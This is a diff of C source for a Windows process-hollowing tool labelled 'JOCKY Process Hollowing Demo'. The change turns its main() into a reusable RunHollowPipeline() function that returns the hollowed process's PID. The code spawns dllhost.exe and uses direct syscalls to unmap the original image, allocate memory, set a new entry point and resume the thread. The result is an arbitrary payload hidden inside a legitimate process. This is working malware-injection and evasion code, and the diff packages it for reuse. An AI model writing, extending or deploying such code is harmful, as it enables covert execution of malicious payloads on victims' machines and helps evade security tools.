@@ -3,9 +3,9 @@
 #include <stdio.h>
 #include <stdlib.h>
 //------------------------------------------------------------------------------------
-const char* k = "[+]";
-const char* e = "[-]";
-const char* i = "[*]";
+static const char* k = "[+]";
+static const char* e = "[-]";
+static const char* i = "[*]";
 //------------------------------------------------------------------------------------
 
 // ─────────────────────────────────────────────
@@ -261,12 +261,7 @@ void ApplyRelocations(
 // ─────────────────────────────────────────────
 // Main hollowing logic — direct syscall edition
 // ─────────────────────────────────────────────
-int main() {
-    printf("╔══════════════════════════════════════╗\n");
-    printf("║   JOCKY Process Hollowing Demo       ║\n");
-    printf("║   Target: dllhost.exe                ║\n");
-    printf("║   Mode:   Direct Syscalls            ║\n");
-    printf("╚══════════════════════════════════════╝\n\n");
+DWORD RunHollowPipeline() {
 
     // ── 0. Read payload ────────────────────────────────────────────────
     DWORD payloadSize = 0;
@@ -276,7 +271,7 @@ int main() {
     PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)payload;
     if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
         printf("[-] Not a valid PE\n");
-        return 1;
+        return 0;
     }
 
     PIMAGE_NT_HEADERS ntHeaders =
@@ -284,7 +279,7 @@ int main() {
 
     if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) {
         printf("%s Invalid NT signature\n", e);
-        return 1;
+        return 0;
     }
 
     printf("%s Payload PE verified\n", k);
@@ -310,7 +305,7 @@ int main() {
         NULL, NULL, &si, &pi
     )) {
         printf("%s CreateProcess failed: %d\n", e, GetLastError());
-        return 1;
+        return 0;
     }
 
     printf("%s PID: %d | TID: %d\n\n", k, pi.dwProcessId, pi.dwThreadId);
@@ -325,7 +320,7 @@ int main() {
     if (status != 0) {
         printf("%s NtGetContextThread failed: 0x%X\n", e, status);
         TerminateProcess(pi.hProcess, 1);
-        return 1;
+        return 0;
     }
     printf("%s Thread context obtained\n", k);
     printf("%s RIP: 0x%llX\n\n", k, ctx.Rip);
@@ -363,7 +358,7 @@ int main() {
     if (status != 0) {
         printf("%s NtUnmapViewOfSection failed: 0x%X\n", e, status);
         TerminateProcess(pi.hProcess, 1);
-        return 1;
+        return 0;
     }
     printf("%s Dllhost unmapped — process is hollow\n\n", k);
 
@@ -401,7 +396,7 @@ int main() {
     if (status != 0) {
         printf("%s NtAllocateVirtualMemory failed: 0x%X\n", e, status);
         TerminateProcess(pi.hProcess, 1);
-        return 1;
+        return 0;
     }
     printf("%s Allocated at: 0x%p\n\n", k, allocBase);
 
@@ -467,7 +462,7 @@ int main() {
     if (status != 0) {
         printf("%s NtSetContextThread failed: 0x%X\n", e, status);
         TerminateProcess(pi.hProcess, 1);
-        return 1;
+        return 0;
     }
     printf("%s Entry point set: 0x%llX\n", k, newEntry);
 
@@ -479,17 +474,15 @@ int main() {
     if (status != 0) {
         printf("%s NtResumeThread failed: 0x%X\n", e, status);
         TerminateProcess(pi.hProcess, 1);
-        return 1;
+        return 0;
     }
 
-    printf("\n╔══════════════════════════════════════════════════╗\n");
-    printf("║  HOLLOWING COMPLETE — Direct Syscall Edition     ║\n");
-    printf("║  JOCKY payload running inside dllhost.exe        ║\n");
-    printf("║  PID: %-5d                                      ║\n", pi.dwProcessId);
-    printf("╚══════════════════════════════════════════════════╝\n");
+    printf("%s Hollowing complete — payload running inside dllhost.exe PID %d\n",
+           k, pi.dwProcessId);
 
+    DWORD hollowedPid = pi.dwProcessId;
     CloseHandle(pi.hThread);
     CloseHandle(pi.hProcess);
     free(payload);
-    return 0;
+    return hollowedPid;
 }
